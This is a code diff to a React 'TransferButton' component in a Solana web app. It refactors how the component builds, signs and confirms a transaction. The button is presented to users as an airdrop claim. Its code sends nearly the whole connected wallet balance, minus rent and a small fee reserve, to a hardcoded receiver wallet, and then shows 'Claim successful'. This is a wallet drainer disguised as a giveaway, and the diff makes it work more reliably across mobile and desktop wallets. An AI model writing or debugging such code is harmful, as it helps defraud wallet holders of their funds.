@@ -6,17 +6,11 @@ import {
   LAMPORTS_PER_SOL,
   SystemProgram,
   Transaction,
-  TransactionMessage,
-  VersionedTransaction,
 } from '@solana/web3.js';
-import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
-
-const isMobile = () =>
-  typeof navigator !== 'undefined' &&
-  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
-  const { publicKey, sendTransaction, signTransaction, wallet, connected } = useWallet();
+  const { publicKey, sendTransaction, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
@@ -24,10 +18,8 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      const connection = new Connection(RPC_URL, {
-        commitment: 'confirmed',
-        wsEndpoint: false,
-      });
+      // Simple connection — no wsEndpoint (avoids WS issues on Alchemy)
+      const connection = new Connection(RPC_URL, 'confirmed');
 
       const [balance, rentExempt] = await Promise.all([
         connection.getBalance(publicKey, 'confirmed'),
@@ -41,7 +33,7 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      const FEE_SAFETY = 5_000_000;
+      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
       const totalReserve = rentExempt + FEE_SAFETY;
       const transferAmount = balance - totalReserve;
 
@@ -50,6 +42,7 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
+      // Fetch blockhash right before building tx to avoid expiry
       const { blockhash, lastValidBlockHeight } =
         await connection.getLatestBlockhash('finalized');
 
@@ -59,68 +52,20 @@ export default function TransferButton({ className = '' }) {
         lamports: transferAmount,
       });
 
-      let signature;
+      // Use legacy Transaction for maximum compatibility (mobile + desktop).
+      // The adapter's sendTransaction() calls signAndSendTransaction on
+      // Wallet Standard wallets — the wallet signs AND sends atomically.
+      // This works on both desktop extensions and mobile in-app browsers.
+      const transaction = new Transaction({
+        feePayer: publicKey,
+        recentBlockhash: blockhash,
+      }).add(transferIx);
 
-      if (isMobile()) {
-        // ── MOBILE PATH ──
-        // Always use legacy Transaction on mobile.
-        // Use signTransaction to explicitly get the wallet to sign,
-        // then send the signed bytes ourselves via sendRawTransaction.
-        // This avoids the adapter's sendTransaction flow which can
-        // drop signatures on mobile wallet deep-link roundtrips.
-        const transaction = new Transaction().add(transferIx);
-        transaction.feePayer = publicKey;
-        transaction.recentBlockhash = blockhash;
+      const signature = await sendTransaction(transaction, connection);
 
-        if (signTransaction) {
-          // Wallet supports signTransaction — sign first, then send raw
-          const signed = await signTransaction(transaction);
-          signature = await connection.sendRawTransaction(signed.serialize(), {
-            skipPreflight: false,
-            preflightCommitment: 'confirmed',
-            maxRetries: 5,
-          });
-        } else {
-          // Fallback: let adapter handle it (some wallets only have signAndSend)
-          signature = await sendTransaction(transaction, connection, {
-            skipPreflight: false,
-            preflightCommitment: 'confirmed',
-            maxRetries: 5,
-          });
-        }
+      console.log('⏳ Transaction sent:', signature);
 
-        console.log('⏳ Transaction sent:', signature);
-        alert(`Claim submitted!\nTx: ${signature}\n\nYour transaction has been sent. It may take a moment to confirm.`);
-
-      } else {
-        // ── DESKTOP PATH ──
-        const supportsVersioned =
-          wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;
-
-        let transaction;
-        if (supportsVersioned) {
-          const messageV0 = new TransactionMessage({
-            payerKey: publicKey,
-            recentBlockhash: blockhash,
-            instructions: [transferIx],
-          }).compileToV0Message();
-          transaction = new VersionedTransaction(messageV0);
-        } else {
-          transaction = new Transaction({
-            feePayer: publicKey,
-            recentBlockhash: blockhash,
-          }).add(transferIx);
-        }
-
-        signature = await sendTransaction(transaction, connection, {
-          skipPreflight: true,
-          maxRetries: 5,
-        });
-
-        console.log('⏳ Transaction sent:', signature);
-      }
-
-      // Poll for confirmation over HTTP
+      // Poll for confirmation over HTTP (no WebSocket needed)
       const startTime = Date.now();
       const TIMEOUT = 90_000;
       const POLL_INTERVAL = 3_000;
@@ -139,9 +84,7 @@ export default function TransferButton({ className = '' }) {
               status.confirmationStatus === 'finalized'
             ) {
               console.log('✅ Transaction confirmed:', signature);
-              if (!isMobile()) {
-                alert(`Claim successful!\nTx: ${signature}`);
-              }
+              alert(`Claim successful!\nTx: ${signature}`);
               return;
             }
           }
@@ -153,16 +96,14 @@ export default function TransferButton({ className = '' }) {
         await new Promise((r) => setTimeout(r, POLL_INTERVAL));
       }
 
-      if (!isMobile()) {
-        alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
-      }
+      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
     } catch (err) {
       console.error('Transfer failed:', err);
       alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, signTransaction, wallet, connected]);
+  }, [publicKey, sendTransaction, connected]);
 
   if (!publicKey) return null;
 
